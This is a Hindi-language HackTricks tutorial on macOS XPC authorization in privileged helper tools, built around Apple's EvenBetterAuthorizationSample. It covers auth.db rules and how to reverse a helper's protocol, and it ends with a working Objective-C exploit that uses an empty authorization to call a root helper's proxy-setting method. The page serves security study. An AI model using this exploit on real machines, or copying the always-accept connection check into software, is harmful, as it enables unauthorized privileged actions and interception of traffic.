# macOS XPC अधिकारीकरण

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम विशेषज्ञ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम विशेषज्ञ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में।

</details>
{% endhint %}

## XPC अधिकारीकरण

एप्पल ने एक और तरीका भी प्रस्तुत किया है जिससे पता चल सके कि कनेक्टिंग प्रक्रिया को **एक उद्घाटित XPC विधि को कॉल करने की अनुमति** है।

जब एक एप्लिकेशन को **विशेषाधिकारी उपयोगकर्ता के रूप में कार्रवाई करनी होती है**, तो विशेषाधिकारी उपयोगकर्ता के रूप में एप्लिकेशन को चलाने की बजाय आम तौर पर एक HelperTool को रूट के रूप में स्थापित करता है जो एप्लिकेशन से उन कार्रवाइयों को करने के लिए कॉल किया जा सकता है। हालांकि, सेवा को कॉल करने वाली एप्लिकेशन के पास पर्याप्त अधिकार होने चाहिए।

### ShouldAcceptNewConnection हमेशा YES

एक उदाहरण [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample) में पाया जा सकता है। `App/AppDelegate.m` में यह **HelperTool** से **कनेक्ट** करने की कोशिश करता है। और `HelperTool/HelperTool.m` में फ़ंक्शन **`shouldAcceptNewConnection`** किसी भी पूर्व निर्दिष्ट आवश्यकताओं की जांच नहीं करेगा। यह हमेशा YES लौटाएगा:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
इस जाँच को सही ढंग से कैसे कॉन्फ़िगर करने के बारे में अधिक जानकारी के लिए:

{% content-ref url="macos-xpc-connecting-process-check/" %}
[macos-xpc-connecting-process-check](macos-xpc-connecting-process-check/)
{% endcontent-ref %}

### एप्लिकेशन अधिकार

हालांकि, **जब HelperTool से कोई विधि कॉल की जाती है तो कुछ **अधिकारीकरण हो रहा है।

`App/AppDelegate.m` से **`applicationDidFinishLaunching`** फ़ंक्शन एप्लिकेशन शुरू होने के बाद एक खाली अधिकारीकरण संदर्भ बनाएगा। यह हमेशा काम करना चाहिए।\
फिर, वह उस अधिकारीकरण संदर्भ में कुछ अधिकार जोड़ने का प्रयास करेगा `setupAuthorizationRights` को कॉल करके:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
फ़ंक्शन `setupAuthorizationRights` से `Common/Common.m` में एप्लिकेशन के अधिकारों को ऑथ डेटाबेस `/var/db/auth.db` में स्टोर किया जाएगा। ध्यान दें कि यह केवल उन अधिकारों को जो अभी तक डेटाबेस में नहीं हैं जोड़ेगा।
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
फ़ंक्शन `enumerateRightsUsingBlock` वह एक है जिसका उपयोग अनुप्रयोगों की अनुमतियों को प्राप्त करने के लिए किया जाता है, जो `commandInfo` में परिभाषित हैं:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
इसका मतलब है कि इस प्रक्रिया के अंत में, `commandInfo` के भीतर घोषित अनुमतियाँ `/var/db/auth.db` में संग्रहीत की जाएंगी। ध्यान दें कि वहां आप **प्रत्येक विधि** के लिए जो **प्रमाणीकरण की आवश्यकता होगी**, **अनुमति नाम** और **`kCommandKeyAuthRightDefault`** मिलेगा। अंतिम वाला **इसे कौन प्राप्त कर सकता है** दर्शाता है।

एक अधिकार को कौन पहुंच सकता है यह दिखाने के लिए विभिन्न scope हैं। उनमें से कुछ [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity\_authorization/lib/AuthorizationDB.h) में परिभाषित हैं (आप [इनमें से सभी को यहाँ](https://www.dssw.co.uk/reference/authorization-rights/) पा सकते हैं), लेकिन सारांश में:

<table><thead><tr><th width="284.3333333333333">नाम</th><th width="165">मान</th><th>विवरण</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>कोई भी</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>कोई नहीं</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>वर्तमान उपयोगकर्ता को एडमिन होना चाहिए (एडमिन समूह के भीतर)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>उपयोगकर्ता से प्रमाणित करें।</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>उपयोगकर्ता से प्रमाणित करें। उसे एडमिन होना चाहिए (एडमिन समूह के भीतर)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>नियम निर्दिष्ट करें</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>अधिक टिप्पणियाँ निर्दिष्ट करें</td></tr></tbody></table>

### अधिकार सत्यापन

`HelperTool/HelperTool.m` में फ़ंक्शन **`readLicenseKeyAuthorization`** यह जांचता है कि कॉलर को **ऐसी विधि को निष्पादित करने की** अधिकृतता है या नहीं, फ़ंक्शन **`checkAuthorization`** को कॉल करके। यह फ़ंक्शन जांचेगा कि क्या कॉल करने वाली प्रक्रिया द्वारा भेजे गए **authData** में **सही प्रारूप** है और फिर यह जांचेगा कि **विशेष विधि को कॉल करने के लिए क्या आवश्यक है**। अगर सब कुछ ठीक होता है तो **वापसी गई `error` `nil` होगी**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
नोट करें कि **सही कॉल करने के लिए आवश्यकताओं की जांच करने के लिए** उस तरीके को कॉल करने के लिए फ़ंक्शन `authorizationRightForCommand` बस पहले कमेंट ऑब्जेक्ट **`commandInfo`** की जांच करेगा। फिर, यह **`AuthorizationCopyRights`** को कॉल करेगा **कि क्या उसके पास उस फ़ंक्शन को कॉल करने का अधिकार है** (नोट करें कि फ़्लैग्स उपयोगकर्ता के साथ बातचीत की अनुमति देते हैं)।

इस मामले में, फ़ंक्शन `readLicenseKeyAuthorization` को कॉल करने के लिए `kCommandKeyAuthRightDefault` को `@kAuthorizationRuleClassAllow` के रूप में परिभाषित किया गया है। इसलिए **कोई भी इसे कॉल कर सकता है**।

### डीबी सूचना

यह उल्लेख किया गया था कि यह सूचना `/var/db/auth.db` में संग्रहित है। आप सभी संग्रहित नियमों की सूची निम्नलिखित के साथ देख सकते हैं:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
फिर, आप यह देख सकते हैं कि कौन अधिकार का उपयोग कर सकता है:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### अनुमति अधिकार

आप **सभी अनुमति विन्यास** [**यहाँ**](https://www.dssw.co.uk/reference/authorization-rights/) पा सकते हैं, लेकिन उन संयोजनों में से जो उपयोगकर्ता संवाद की आवश्यकता नहीं करेंगे, वे होंगे:

1. **'authenticate-user': 'false'**
* यह सबसे सीधी कुंजी है। यदि इसे `false` पर सेट किया गया है, तो इससे स्पष्ट होता है कि एक उपयोगकर्ता को इस अधिकार प्राप्त करने के लिए प्रमाणीकरण प्रदान करने की आवश्यकता नहीं है।
* यह **दो नीचे के में से किसी एक के साथ या उपयोगकर्ता को सूचित करना** के साथ उपयोग किया जाता है।
2. **'allow-root': 'true'**
* यदि एक उपयोगकर्ता जैसे रूट उपयोगकर्ता (जिसके पास उच्च अनुमतियाँ होती हैं) के रूप में काम कर रहा है, और यह कुंजी `true` पर सेट की गई है, तो रूट उपयोगकर्ता संभावित रूप से इस अधिकार को अधिक प्रमाणीकरण के बिना प्राप्त कर सकता है। हालांकि, सामान्यत: रूट उपयोगकर्ता स्थिति तक पहुंचने के लिए पहले से ही प्रमाणीकरण की आवश्यकता होती है, इसलिए यह अधिकांश उपयोगकर्ताओं के लिए "कोई प्रमाणीकरण" स्थिति नहीं है।
3. **'session-owner': 'true'**
* यदि `true` पर सेट किया गया है, तो सत्र के मालिक (वर्तमान में लॉग इन उपयोगकर्ता) खुद से इस अधिकार को स्वचालित रूप से प्राप्त करेगा। यह अतिरिक्त प्रमाणीकरण को छलने की संभावना है अगर उपयोगकर्ता पहले से ही लॉग इन है।
4. **'shared': 'true'**
* यह कुंजी प्रमाणीकरण के बिना अधिकार प्रदान नहीं करती। इसके बजाय, यदि इसे `true` पर सेट किया गया है, तो इसका अर्थ है कि एक बार अधिकृत होने के बाद, इसे कई प्रक्रियाओं के बीच साझा किया जा सकता है बिना प्रत्येक को पुनः प्रमाणीकरण की आवश्यकता हो। लेकिन अधिकार की प्रारंभिक प्रदान में प्रमाणीकरण की आवश्यकता होगी यदि ऐसा कोई अन्य कुंजी जैसे `'authenticate-user': 'false'` के साथ मिलाया जाए।

आप [**इस स्क्रिप्ट का उपयोग कर सकते हैं**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) दिलचस्प अधिकार प्राप्त करने के लिए:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
## प्रमाणीकरण का उलटाव

### जांचें कि क्या EvenBetterAuthorization का उपयोग हो रहा है

यदि आपको फ़ंक्शन मिलता है: **`[HelperTool checkAuthorization:command:]`** तो संभावना है कि प्रक्रिया पहले से उल्लिखित प्रमाणीकरण के लिए यह उपयोग कर रही है:

<figure><img src="../../../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

इसके बाद, यदि यह फ़ंक्शन `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree` जैसे फ़ंक्शन को कॉल कर रहा है, तो यह [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154) का उपयोग कर रहा है।

जांचें **`/var/db/auth.db`** कि क्या उपयोगकर्ता से किसी विशेषाधिकारित कार्रवाई को कॉल करने की अनुमति प्राप्त करना संभव है बिना उपयोगकर्ता इंटरैक्शन के।

### प्रोटोकॉल संचार

फिर, आपको XPC सेवा के साथ संचार स्थापित करने की क्षमता होने के लिए प्रोटोकॉल स्कीमा खोजने की आवश्यकता है।

फ़ंक्शन **`shouldAcceptNewConnection`** प्रोटोकॉल को निर्यात करने की संकेत देता है:

<figure><img src="../../../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

इस मामले में, हमारे पास EvenBetterAuthorizationSample में जैसा ही है, [**इस लाइन की जांच करें**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94)।

जानकारी के अनुसार, उपयोग किए जाने वाले प्रोटोकॉल का नाम पता चलने पर, यह संभव है कि आप **इसकी हेडर परिभाषा को डंप** करें:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
अंत में, हमें केवल **उजागर Mach सेवा का नाम** पता होना चाहिए ताकि हम इसके साथ संचार स्थापित कर सकें। इसे खोजने के कई तरीके हैं:

* **`[HelperTool init()]`** में जहां आप देख सकते हैं कि Mach सेवा का उपयोग किया जा रहा है:

<figure><img src="../../../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

* लॉन्चडी पीएलआईएसटी में:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### शोषण उदाहरण

इस उदाहरण में निम्नलिखित बनाया गया है:

* कार्यों के साथ प्रोटोकॉल की परिभाषा
* पहुँच के लिए खाली ऑथ
* XPC सेवा के साथ एक कनेक्शन
* किसी भी कनेक्शन सफल रहा तो कार्य को कॉल करें
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## संदर्भ

* [https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/](https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/)

{% hint style="success" %}
AWS हैकिंग सीखें और प्रैक्टिस करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम एक्सपर्ट (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और प्रैक्टिस करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम एक्सपर्ट (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** को** **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PR जमा करके।

</details>
{% endhint %}
